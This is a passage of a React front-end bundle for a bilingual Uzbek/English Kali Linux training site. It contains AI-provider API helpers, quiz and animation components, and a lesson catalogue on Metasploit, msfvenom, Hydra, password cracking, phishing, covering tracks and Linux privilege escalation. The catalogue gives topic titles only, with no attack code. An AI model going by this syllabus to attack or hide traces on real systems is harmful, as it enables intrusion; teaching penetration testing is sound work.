"use strict";
// ─────────────────────────────────────────────────────────────
// KALI LINUX ACADEMY — Main Bundle
// ─────────────────────────────────────────────────────────────
const {useState,useEffect,useRef,useCallback,createContext,useContext}=React;

// ── Constants ────────────────────────────────────────────────
const PROG_KEY="ka_progress",ROUTE_KEY="ka_route",THEME_KEY="ka_theme",LANG_KEY="ka_lang";
const AI_KEYS_STORE="wa_ai_keys",AI_ACTIVE_STORE="wa_ai_active_id";

// ── AI helpers (shares keys with Windows/Network Academy) ─────
function loadAiKeys(){try{const s=localStorage.getItem(AI_KEYS_STORE);if(s)return JSON.parse(s);}catch{}return[];}
function getActiveAiKey(){const k=loadAiKeys();if(!k.length)return null;const id=localStorage.getItem(AI_ACTIVE_STORE)||"";return k.find(x=>x.id===id)||k[0];}
async function callAI(prompt){
  const px=localStorage.getItem("wa_ai_proxy")||"";
  if(px){const r=await fetch(px,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({provider:"",prompt})});const d=await r.json();if(!r.ok)throw new Error(d.error||"Proxy error");return d.text;}
  const a=getActiveAiKey();if(!a||!a.key)throw new Error("no_key");
  const {provider:pv,key}=a;
  if(pv==="groq"){const r=await fetch("https://api.groq.com/openai/v1/chat/completions",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+key},body:JSON.stringify({model:"llama-3.3-70b-versatile",messages:[{role:"user",content:prompt}],max_tokens:900,temperature:0.3})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"Groq error");return d.choices[0].message.content;}
  if(pv==="openai"){const r=await fetch("https://api.openai.com/v1/chat/completions",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+key},body:JSON.stringify({model:"gpt-4o-mini",messages:[{role:"user",content:prompt}],max_tokens:900})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"OpenAI error");return d.choices[0].message.content;}
  if(pv==="anthropic"){const r=await fetch("https://api.anthropic.com/v1/messages",{method:"POST",headers:{"Content-Type":"application/json","x-api-key":key,"anthropic-version":"2023-06-01","anthropic-dangerous-direct-browser-access":"true"},body:JSON.stringify({model:"claude-haiku-4-5-20251001",max_tokens:900,messages:[{role:"user",content:prompt}]})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"Anthropic error");return d.content[0].text;}
  if(pv==="gemini"){const r=await fetch(`https://generativelanguage.googleapis.com/v1/models/gemini-2.0-flash-lite:generateContent?key=${key}`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({contents:[{parts:[{text:prompt}]}],generationConfig:{maxOutputTokens:900,temperature:0.3}})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"Gemini error");return d.candidates[0].content.parts[0].text;}
  throw new Error("no_key");
}

// ── Progress ─────────────────────────────────────────────────
function todayStr(){return new Date().toISOString().slice(0,10);}
function loadProgress(){try{const s=localStorage.getItem(PROG_KEY);if(s)return{...defaultProgress(),...JSON.parse(s)};}catch{}return defaultProgress();}
function defaultProgress(){return{xp:0,level:1,completedLessons:[],name:"Student",lastLogin:null,streak:0};}
function saveProgress(p){try{localStorage.setItem(PROG_KEY,JSON.stringify(p));}catch{}}
function xpToLevel(xp){return Math.max(1,Math.floor(xp/500)+1);}

// ── Language ─────────────────────────────────────────────────
const LangCtx=createContext("uz");
function useLang(){return useContext(LangCtx);}
function t(lang,uz,en){return lang==="en"?en:uz;}

// ── Icons (SVG paths) ─────────────────────────────────────────
const ICONS={
  shield:"M12 2L4 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-8-3z",
  network:"M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z",
  terminal:"M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8h16v10zM6 10l1.4-1.4L11 12.2l-3.6 3.6L6 14.4l2.2-2.2L6 10zm6 4.5h5V16h-5z",
  target:"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z",
  bug:"M20 8h-2.81c-.45-.78-1.07-1.45-1.82-1.96L17 4.41 15.59 3l-2.17 2.17C12.96 5.06 12.49 5 12 5c-.49 0-.96.06-1.41.17L8.41 3 7 4.41l1.62 1.63C7.88 6.55 7.26 7.22 6.81 8H4v2h2.09c-.05.33-.09.66-.09 1v1H4v2h2v1c0 .34.04.67.09 1H4v2h2.81c1.04 1.79 2.97 3 5.19 3s4.15-1.21 5.19-3H20v-2h-2.09c.05-.33.09-.66.09-1v-1h2v-2h-2v-1c0-.34-.04-.67-.09-1H20V8zm-6 8h-4v-2h4v2zm0-4h-4v-2h4v2z",
  lock:"M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z",
  star:"M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z",
  code:"M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z",
  cpu:"M9 3H7c-2.2 0-4 1.8-4 4v2h2V7c0-1.1.9-2 2-2h2V3zm8 0h-2v2h2c1.1 0 2 .9 2 2v2h2V7c0-2.2-1.8-4-4-4zM3 15v2c0 2.2 1.8 4 4 4h2v-2H7c-1.1 0-2-.9-2-2v-2H3zm18 0v2c0 1.1-.9 2-2 2h-2v2h2c2.2 0 4-1.8 4-4v-2h-2zM7 7h10v10H7z",
  layers:"M11.99 18.54l-7.37-5.73L3 14.07l9 7 9-7-1.63-1.27-7.38 5.74zM12 16l7.36-5.73L21 9l-9-7-9 7 1.63 1.27L12 16z",
  x:"M18.3 5.71a1 1 0 0 0-1.41 0L12 10.59 7.11 5.7A1 1 0 0 0 5.7 7.11L10.59 12 5.7 16.89a1 1 0 0 0 1.41 1.41L12 13.41l4.89 4.89a1 1 0 0 0 1.41-1.41L13.41 12l4.89-4.89a1 1 0 0 0 0-1.4z",
  send:"M2.01 21L23 12 2.01 3 2 10l15 2-15 2z",
  spark:"M13 2L3 14h9l-1 8 10-12h-9l1-8z",
  key:"M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z",
  check:"M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z",
  arrow:"M8 5v14l11-7z",
  settings:"M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.488.488 0 0 0-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.57 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z",
  database:"M12 3C7.58 3 4 4.79 4 7v10c0 2.21 3.58 4 8 4s8-1.79 8-4V7c0-2.21-3.58-4-8-4zm0 2c3.87 0 6 1.5 6 2s-2.13 2-6 2-6-1.5-6-2 2.13-2 6-2zm0 14c-3.87 0-6-1.5-6-2v-1.5c1.26.83 3.5 1.5 6 1.5s4.74-.67 6-1.5V17c0 .5-2.13 2-6 2z",
  wifi:"M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3a4.237 4.237 0 0 0-6 0zm-4-4l2 2a7.074 7.074 0 0 1 10 0l2-2C15.14 9.14 8.87 9.14 5 13z",
};
function Icon({name,size=16,style={}}){const d=ICONS[name]||ICONS.star;return React.createElement("svg",{width:size,height:size,viewBox:"0 0 24 24",fill:"currentColor",style:{flexShrink:0,...style}},React.createElement("path",{d}));}

// ── Core UI components ─────────────────────────────────────────
function H2({num,children}){return React.createElement("h2",{style:{fontFamily:"var(--font-display)",fontSize:18,fontWeight:700,margin:"28px 0 10px",color:"var(--text-0)",display:"flex",alignItems:"center",gap:10}},num&&React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",fontWeight:900}},num),children);}
function P({children,style={}}){return React.createElement("p",{style:{fontSize:13.5,lineHeight:1.75,color:"var(--text-1)",margin:"0 0 14px",...style}},children);}
function Term({children}){return React.createElement("code",{style:{background:"rgba(168,85,247,0.12)",border:"1px solid var(--accent-border)",borderRadius:6,padding:"1px 6px",fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)"}},children);}
function Terminal({children}){return React.createElement("pre",{style:{background:"rgba(0,0,0,0.5)",border:"1px solid var(--border)",borderRadius:10,padding:"14px 16px",fontFamily:"var(--font-mono)",fontSize:12,color:"#7effb2",overflowX:"auto",margin:"12px 0",lineHeight:1.65}},children);}
function InfoBox({children,color="var(--accent)"}){return React.createElement("div",{style:{background:`${color}0d`,border:`1px solid ${color}33`,borderRadius:12,padding:"12px 16px",margin:"12px 0",fontSize:12.5,color:"var(--text-1)",lineHeight:1.7}},children);}

// ── Quiz ──────────────────────────────────────────────────────
function Quiz({q,opts,correct,exp}){
  const lang=useLang();
  const [sel,setSel]=useState(null);
  const tx=x=>x==null?"":typeof x==="string"?x:t(lang,x.uz,x.en);
  return React.createElement("div",{style:{margin:"18px 0",padding:"16px 18px",background:"var(--surface)",border:"1px solid var(--accent-border)",borderRadius:14}},
    React.createElement("div",{style:{display:"flex",alignItems:"center",gap:8,marginBottom:12}},
      React.createElement(Icon,{name:"spark",size:14,style:{color:"var(--accent)"}}),
      React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:"var(--accent)",fontWeight:700,letterSpacing:1}},t(lang,"BILIMNI TEKSHIRING","QUICK QUIZ"))
    ),
    React.createElement("div",{style:{fontSize:13.5,fontWeight:600,color:"var(--text-0)",marginBottom:12,lineHeight:1.6}},tx(q)),
    opts.map((o,i)=>{
      const chosen=sel===i,isCorrect=i===correct;
      const bg=sel==null?"var(--bg-2)":isCorrect?"rgba(0,255,136,0.12)":chosen?"rgba(255,58,94,0.12)":"var(--bg-2)";
      const bd=sel==null?"var(--border)":isCorrect?"#00ff88":chosen?"var(--c-attack)":"var(--border)";
      return React.createElement("button",{key:i,onClick:()=>sel==null&&setSel(i),disabled:sel!=null,
        style:{display:"flex",alignItems:"center",gap:10,width:"100%",boxSizing:"border-box",textAlign:"left",marginBottom:7,padding:"10px 12px",borderRadius:9,cursor:sel==null?"pointer":"default",appearance:"none",border:`1.5px solid ${bd}`,background:bg,color:"var(--text-0)",fontSize:12.5}},
        React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--text-3)",fontWeight:700}},String.fromCharCode(65+i)),
        React.createElement("span",{style:{flex:1}},tx(o)),
        sel!=null&&isCorrect&&React.createElement(Icon,{name:"check",size:14,style:{color:"#00ff88"}}),
        sel!=null&&chosen&&!isCorrect&&React.createElement(Icon,{name:"x",size:14,style:{color:"var(--c-attack)"}})
      );
    }),
    sel!=null&&React.createElement("div",{style:{marginTop:10,padding:"10px 12px",borderRadius:9,background:sel===correct?"rgba(0,255,136,0.08)":"rgba(255,58,94,0.08)",border:`1px solid ${sel===correct?"rgba(0,255,136,0.3)":"rgba(255,58,94,0.3)"}`,fontSize:12,color:"var(--text-1)",lineHeight:1.6}},
      React.createElement("strong",{style:{color:sel===correct?"#00ff88":"var(--c-attack)"}},sel===correct?t(lang,"To'g'ri! ","Correct! "):t(lang,"Noto'g'ri. ","Incorrect. ")),
      tx(exp))
  );
}

// ── Lessons data ──────────────────────────────────────────────
const LESSONS={
  1:{num:"L01",sec:1,uz:"Kali Linux nima?",en:"What is Kali Linux?",sub:"Kali'ga kirish, tarix va use-case'lar"},
  2:{num:"L02",sec:1,uz:"Kali'ni O'rnatish",en:"Installing Kali",sub:"VirtualBox, VMware, WSL va live USB"},
  3:{num:"L03",sec:1,uz:"Buyruq Qatori Asoslari",en:"Command Line Basics",sub:"ls, cd, pwd, cat, grep, pipe va redirect"},
  4:{num:"L04",sec:1,uz:"Linux Fayl Tizimi",en:"Linux File System",sub:"FHS: /etc, /var, /home, /usr, /root"},
  5:{num:"L05",sec:1,uz:"Foydalanuvchilar & Ruxsatlar",en:"Users & Permissions",sub:"chmod, chown, sudo, /etc/passwd"},
  6:{num:"L06",sec:1,uz:"Paketlarni Boshqarish (apt)",en:"Package Management (apt)",sub:"apt update, install, dpkg, repolar"},
  7:{num:"L07",sec:1,uz:"Bash Skripting",en:"Bash Scripting",sub:"O'zgaruvchilar, tsikllar, shartlar, funksiyalar"},
  8:{num:"L08",sec:1,uz:"Tarmoq Asoslari",en:"Networking Basics",sub:"ip, ifconfig, ping, netstat, ss"},
  9:{num:"L09",sec:1,uz:"Xizmatlar (Services)",en:"Services",sub:"systemctl, SSH, Apache, PostgreSQL"},
  10:{num:"L10",sec:1,uz:"Kali Vositalari Sharhi",en:"Kali Tools Overview",sub:"Menyu bo'yicha 600+ vosita toifasi"},
  11:{num:"L11",sec:2,uz:"Nmap",en:"Nmap",sub:"Port skanerlash va xizmat aniqlash"},
  12:{num:"L12",sec:2,uz:"Netdiscover",en:"Netdiscover",sub:"ARP orqali tirik xostlarni topish"},
  13:{num:"L13",sec:2,uz:"Masscan",en:"Masscan",sub:"Ultra-tez internet miqyosidagi skan"},
  14:{num:"L14",sec:2,uz:"DNS Enumeratsiya",en:"DNS Enumeration",sub:"dnsenum, dnsrecon, zona transfer"},
  15:{num:"L15",sec:2,uz:"theHarvester",en:"theHarvester",sub:"OSINT: email, subdomen, xostlar"},
  16:{num:"L16",sec:2,uz:"Nikto",en:"Nikto",sub:"Veb-server zaifliklari skaneri"},
  17:{num:"L17",sec:2,uz:"WhatWeb",en:"WhatWeb",sub:"Veb-texnologiyalarni aniqlash"},
  18:{num:"L18",sec:2,uz:"enum4linux",en:"enum4linux",sub:"Windows/Samba enumeratsiya"},
  19:{num:"L19",sec:2,uz:"SMB Enumeratsiya",en:"SMB Enumeration",sub:"smbclient, smbmap, share'lar"},
  20:{num:"L20",sec:2,uz:"Wireshark",en:"Wireshark",sub:"Trafik tahlili va paket ushlash"},
  21:{num:"L21",sec:3,uz:"Metasploit Framework",en:"Metasploit Framework",sub:"msfconsole, modullar, Meterpreter"},
  22:{num:"L22",sec:3,uz:"msfvenom",en:"msfvenom",sub:"Payload generatsiya va kodlash"},
  23:{num:"L23",sec:3,uz:"searchsploit & Exploit-DB",en:"searchsploit & Exploit-DB",sub:"Ma'lum ekspluatlarni topish"},
  24:{num:"L24",sec:3,uz:"Hydra",en:"Hydra",sub:"Onlayn parol brute-force"},
  25:{num:"L25",sec:3,uz:"John the Ripper",en:"John the Ripper",sub:"Parol xeshlarini buzish (CPU)"},
  26:{num:"L26",sec:3,uz:"Hashcat",en:"Hashcat",sub:"GPU bilan xesh buzish"},
  27:{num:"L27",sec:3,uz:"Burp Suite",en:"Burp Suite",sub:"Veb-ilova proxy va tahlil"},
  28:{num:"L28",sec:3,uz:"Social Engineering (SET)",en:"Social Engineering (SET)",sub:"Fishing va inson omili hujumlari"},
  29:{num:"L29",sec:3,uz:"Imtiyozlarni Oshirish",en:"Privilege Escalation",sub:"SUID, sudo, kernel exploit asoslari"},
  30:{num:"L30",sec:3,uz:"Izlarni Yashirish & Hisobot",en:"Covering Tracks & Reporting",sub:"Loglar, tozalash va pentest hisoboti"},
  31:{num:"L31",sec:4,uz:"Privesc: Kirish",en:"PrivEsc: Introduction",sub:"Imtiyozlarni oshirish nima va nega muhim"},
  32:{num:"L32",sec:4,uz:"Qo'lda Enumeratsiya",en:"Manual Enumeration",sub:"hostname, uname, ps, sudo -l, find, netstat"},
  33:{num:"L33",sec:4,uz:"Avtomatik Enumeratsiya",en:"Automated Enumeration",sub:"LinPEAS, LinEnum, LES, LSE vositalari"},
  34:{num:"L34",sec:4,uz:"Kernel Exploits",en:"Kernel Exploits",sub:"Yadro versiyasi → exploit → root"},
  35:{num:"L35",sec:4,uz:"Sudo & LD_PRELOAD",en:"Sudo & LD_PRELOAD",sub:"sudo -l, GTFOBins, LD_PRELOAD .so shell"},
  36:{num:"L36",sec:4,uz:"SUID & SGID",en:"SUID & SGID",sub:"find -perm -4000, /etc/shadow, /etc/passwd"},
  37:{num:"L37",sec:4,uz:"Capabilities & Cron",en:"Capabilities & Cron Jobs",sub:"getcap, crontab, yoziladigan skriptlar"},
  38:{num:"L38",sec:4,uz:"PATH & NFS",en:"PATH & NFS",sub:"PATH hijacking, NFS no_root_squash"},
};

const SECTIONS={
  1:{num:"01",uz:"Kali Asoslari",en:"Kali Basics",color:"var(--c-system)",icon:"terminal",count:10,
     descUz:"Kali'ni o'rnatish, Linux buyruq qatori, fayl tizimi, ruxsatlar, apt va bash skriptlashni o'rganing.",
     descEn:"Learn Kali installation, the Linux command line, file system, permissions, apt and bash scripting."},
  2:{num:"02",uz:"Ma'lumot To'plash & Skanerlash",en:"Recon & Scanning",color:"var(--c-defense)",icon:"target",count:10,
     descUz:"Nmap, Masscan, DNS enumeratsiya, theHarvester, Nikto va SMB skanerlash bilan nishon haqida ma'lumot to'plang.",
     descEn:"Gather intel on targets with Nmap, Masscan, DNS enumeration, theHarvester, Nikto and SMB scanning."},
  3:{num:"03",uz:"Ekspluatatsiya & Post",en:"Exploitation & Post",color:"var(--c-attack)",icon:"bug",count:10,
     descUz:"Metasploit, msfvenom, Hydra, John, Hashcat, Burp Suite va imtiyozlarni oshirish bilan ekspluatatsiyani o'rganing.",
     descEn:"Master exploitation with Metasploit, msfvenom, Hydra, John, Hashcat, Burp Suite and privilege escalation."},
  4:{num:"04",uz:"Imtiyozlarni Oshirish",en:"Privilege Escalation",color:"var(--c-warn)",icon:"key",count:8,
     descUz:"Linux'da root'ga ko'tarilish: enumeratsiya, avtomatik vositalar, kernel exploits, sudo, LD_PRELOAD, SUID/SGID, capabilities, cron, PATH va NFS vektorlari.",
     descEn:"Escalating to root on Linux: enumeration, automated tools, kernel exploits, sudo, LD_PRELOAD, SUID/SGID, capabilities, cron, PATH and NFS vectors."},
};

// ── Lesson content: L01 What is Kali Linux ───────────────────
// ── Animated-diagram engine (shared) ──────────────────────────
function NetAnimStyle(){
  return React.createElement("style",null,
`@keyframes na-rise{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
@keyframes na-glow{0%,100%{opacity:.45;transform:scale(1)}50%{opacity:1;transform:scale(1.3)}}
@keyframes na-flow{0%{left:1%;opacity:0}12%{opacity:1}88%{opacity:1}100%{left:95%;opacity:0}}
@keyframes na-dash{to{stroke-dashoffset:-18}}
@keyframes na-blink{0%,100%{opacity:1}50%{opacity:.3}}
.na-rise{animation:na-rise .5s cubic-bezier(.2,.8,.2,1) both}
.na-card{transition:transform .2s ease,border-color .2s ease}
.na-card:hover{transform:translateY(-3px)}
.na-step{transition:all .4s ease;opacity:.4}
.na-step.lit{opacity:1}
.na-dot{width:8px;height:8px;border-radius:50%;animation:na-glow 1s infinite}
.na-wire{position:relative;height:2px;background:linear-gradient(90deg,transparent,var(--accent),transparent);border-radius:2px}
.na-pkt{position:absolute;top:50%;width:9px;height:9px;border-radius:50%;transform:translate(-50%,-50%);animation:na-flow 2.4s linear infinite}
@media (prefers-reduced-motion:reduce){.na-rise,.na-pkt,.na-dot,.na-card{animation:none!important}.na-pkt{left:47%}}`);
}

// color-coded vertical layer stack (generalized OSI visual)
function LayerStack({layers}){
  const lang=useLang();
  return React.createElement("div",{style:{display:"flex",flexDirection:"column",gap:8,margin:"6px 0 4px"}},
    layers.map((l,i)=>React.createElement("div",{key:l.n,className:"na-rise na-card",
      style:{display:"flex",gap:12,alignItems:"flex-start",padding:"11px 14px",background:"var(--surface)",border:`1px solid ${l.color}44`,borderLeft:`3px solid ${l.color}`,borderRadius:11,animationDelay:(i*0.06)+"s"}},
      React.createElement("div",{style:{flexShrink:0,width:30,height:30,borderRadius:8,display:"grid",placeItems:"center",fontFamily:"var(--font-mono)",fontWeight:900,fontSize:13,color:l.color,background:l.color+"22",border:`1.5px solid ${l.color}`}},l.n),
      React.createElement("div",{style:{flex:1}},
        React.createElement("div",{style:{fontWeight:700,fontSize:13.5,color:"var(--text-0)"}},l.name,l.uz&&React.createElement("span",{style:{fontWeight:400,fontSize:11.5,color:"var(--text-2)",marginLeft:8}},l.uz)),
        l.desc&&React.createElement("div",{style:{fontSize:12,color:"var(--text-1)",margin:"3px 0 4px",lineHeight:1.5}},t(lang,l.desc.uz,l.desc.en)),
        l.proto&&React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10.5,color:l.color,opacity:.9}},l.proto)))));
}

// interactive step-through flow (Play / Reset)
function FlowSteps({title,steps,color}){
  const lang=useLang();
  const c=color||"var(--accent)";
  const [step,setStep]=useState(-1);
  const [playing,setPlaying]=useState(false);
  useEffect(()=>{
    if(!playing)return;
    if(step>=steps.length-1){setPlaying(false);return;}
    const id=setTimeout(()=>setStep(s=>s+1),1050);
    return()=>clearTimeout(id);
  },[playing,step,steps.length]);
  const tx=x=>x==null?"":typeof x==="string"?x:t(lang,x.uz,x.en);
  const showAll=step<0;
  return React.createElement("div",{style:{background:"var(--bg-1)",border:"1px solid var(--border)",borderRadius:14,padding:16,margin:"14px 0"}},
    React.createElement("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:12,gap:8,flexWrap:"wrap"}},
      React.createElement("span",{style:{fontSize:12.5,fontWeight:700,color:"var(--text-0)"}},tx(title)),
      React.createElement("div",{style:{display:"flex",gap:6}},
        React.createElement("button",{onClick:()=>{setStep(0);setPlaying(true);},style:{padding:"5px 13px",background:c,color:"#04060d",border:"none",borderRadius:8,fontSize:12,fontWeight:700,cursor:"pointer"}},t(lang,"▶ Ishga tushir","▶ Play")),
        React.createElement("button",{onClick:()=>{setStep(-1);setPlaying(false);},style:{padding:"5px 12px",background:"var(--bg-2)",color:"var(--text-1)",border:"1px solid var(--border)",borderRadius:8,fontSize:12,cursor:"pointer"}},"↺"))),
    React.createElement("div",{style:{display:"flex",flexDirection:"column",gap:7}},
      steps.map((s,i)=>{
        const lit=showAll||i<=step, cur=i===step;
        return React.createElement("div",{key:i,className:"na-step"+(lit?" lit":""),
          style:{display:"flex",alignItems:"center",gap:11,padding:"9px 13px",borderRadius:10,
            background:lit?(cur?c+"14":"rgba(255,255,255,.02)"):"transparent",
            border:`1px solid ${lit?(cur?c+"66":"var(--border)"):"rgba(255,255,255,.05)"}`}},
          React.createElement("div",{style:{flexShrink:0,width:30,height:30,borderRadius:"50%",display:"grid",placeItems:"center",fontSize:15,color:lit?c:"var(--text-2)",background:lit?c+"18":"rgba(255,255,255,.03)",border:`1px solid ${lit?c+"55":"var(--border)"}`}},s.icon||(i+1)),
          React.createElement("div",{style:{flex:1}},
            React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:9.5,letterSpacing:".08em",color:lit?c:"var(--text-2)",marginBottom:1}},"STEP "+(i+1)),
            React.createElement("div",{style:{fontSize:12.5,color:lit?"var(--text-0)":"var(--text-2)",lineHeight:1.45}},tx(s.text))),
          cur&&React.createElement("div",{className:"na-dot",style:{background:c}}));
      })));
}

// animated packet gliding along a wire between two nodes
function PacketFlow({from,to,label,color}){
  const lang=useLang();const c=color||"var(--accent)";
  const tx=x=>typeof x==="string"?x:t(lang,x.uz,x.en);
  return React.createElement("div",{style:{display:"flex",alignItems:"center",gap:10,margin:"12px 0",padding:"14px 12px",background:"var(--bg-1)",border:"1px solid var(--border)",borderRadius:12}},
    React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"var(--text-0)",textAlign:"center",minWidth:60}},tx(from)),
    React.createElement("div",{style:{flex:1,position:"relative"}},
      label&&React.createElement("div",{style:{textAlign:"center",fontFamily:"var(--font-mono)",fontSize:10,color:c,marginBottom:6}},tx(label)),
      React.createElement("div",{className:"na-wire"},React.createElement("div",{className:"na-pkt",style:{background:c,boxShadow:`0 0 8px ${c}`}}))),
    React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"var(--text-0)",textAlign:"center",minWidth:60}},tx(to)));
}

// animated two-column comparison
function CompareCols({left,right}){
  const lang=useLang();
  const tx=x=>typeof x==="string"?x:t(lang,x.uz,x.en);
  const col=d=>React.createElement("div",{className:"na-rise",style:{padding:14,borderRadius:12,background:d.color+"0d",border:`1px solid ${d.color}33`}},
    React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700,color:d.color,marginBottom:9}},tx(d.title)),
    d.rows.map((r,i)=>React.createElement("div",{key:i,style:{fontSize:12,color:"var(--text-1)",padding:"5px 0",borderBottom:i<d.rows.length-1?"1px solid var(--border)":"none",lineHeight:1.5}},tx(r))));
  return React.createElement("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,margin:"12px 0"}},col(left),col(right));
}

// topology diagram — nodes + animated dashed links (SVG)
function NodeMap({nodes,links,color,label}){
  const lang=useLang();const c=color||"var(--accent)";
  return React.createElement("div",{style:{margin:"12px 0",padding:"14px",background:"var(--bg-1)",border:"1px solid var(--border)",borderRadius:12}},
    label&&React.createElement("div",{style:{textAlign:"center",fontFamily:"var(--font-mono)",fontSize:11,color:c,marginBottom:8,fontWeight:700}},typeof label==="string"?label:t(lang,label.uz,label.en)),
    React.createElement("svg",{viewBox:"0 0 280 160",style:{width:"100%",maxWidth:300,display:"block",margin:"0 auto"}},
      links.map((lk,i)=>React.createElement("line",{key:"l"+i,x1:nodes[lk[0]][0],y1:nodes[lk[0]][1],x2:nodes[lk[1]][0],y2:nodes[lk[1]][1],stroke:c,strokeWidth:1.7,strokeDasharray:"5 4",style:{animation:"na-dash 1s linear infinite",opacity:.75}})),
      nodes.map((n,i)=>React.createElement("g",{key:"n"+i},
        React.createElement("circle",{cx:n[0],cy:n[1],r:10,fill:c+"22",stroke:c,strokeWidth:1.9}),
        n[2]&&React.createElement("text",{x:n[0],y:n[1]+22,fill:"var(--text-2)",fontSize:8,textAnchor:"middle",fontFamily:"var(--font-mono)"},n[2])))));
}

// ethics warning InfoBox (attack lessons) — bilingual
function eth(uz,en){return React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(useLang(),uz,en));}

// real slide screenshot with bilingual caption
function SlideImg({src,cap,capEn}){
  const lang=useLang();
  return React.createElement("figure",{className:"na-rise",style:{margin:"14px 0"}},
    React.createElement("img",{src:"./assets/"+src,loading:"lazy",alt:cap||"",
      style:{width:"100%",display:"block",borderRadius:12,border:"1px solid var(--border)",background:"#0a0e17"}}),
    (cap||capEn)&&React.createElement("figcaption",{style:{marginTop:8,fontSize:12,color:"var(--text-2)",lineHeight:1.55,fontStyle:"italic"}},
      t(lang,cap||capEn,capEn||cap)));
}


function KaliVsRegularSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const REG=[
    {col:BL,uz:"Vazifa: SSH loginni tekshirish kerak — vosita qidirilmoqda",en:"Task: need to test an SSH login — searching for a tool",duz:"Oddiy Ubuntu ish stolida pentest vositalari oldindan yo'q.",den:"A regular Ubuntu desktop has no pentest tools preinstalled."},
    {col:AM,uz:"«hydra» topilmadi — sudo apt install hydra kerak, bog'liqliklar yuklanmoqda",en:"«hydra» not found — need sudo apt install hydra, downloading dependencies",duz:"Internet tezligi va repozitoriy holatiga qarab bu daqiqalar oladi.",den:"Depending on internet speed and repo state, this can take minutes."},
    {col:AM,uz:"O'rnatilgach ham wordlist yo'q — Google'da qidirib, qo'lda yuklab olinadi",en:"Even once installed, there's no wordlist — search Google, download it manually",duz:"Har bir yangi vosita uchun shu jarayon qaytariladi.",den:"This process repeats for every new tool you need."},
    {col:D,uz:"⏱ 20+ daqiqa sarflandi — atigi BITTA vosita ishga tayyor bo'ldi",en:"⏱ 20+ minutes spent — only ONE tool is finally ready",duz:"Haqiqiy pentestda o'nlab vosita kerak bo'ladi — vaqt ko'paytiriladi.",den:"A real pentest needs dozens of tools — this time cost multiplies.",final:true,bad:true}
  ];
  const KALI=[
    {col:BL,uz:"Vazifa: SSH loginni tekshirish kerak — Applications menyusi ochiladi",en:"Task: need to test an SSH login — the Applications menu opens",duz:"Xuddi shu vazifa, xuddi shu boshlanish nuqtasi.",den:"The exact same task, the exact same starting point."},
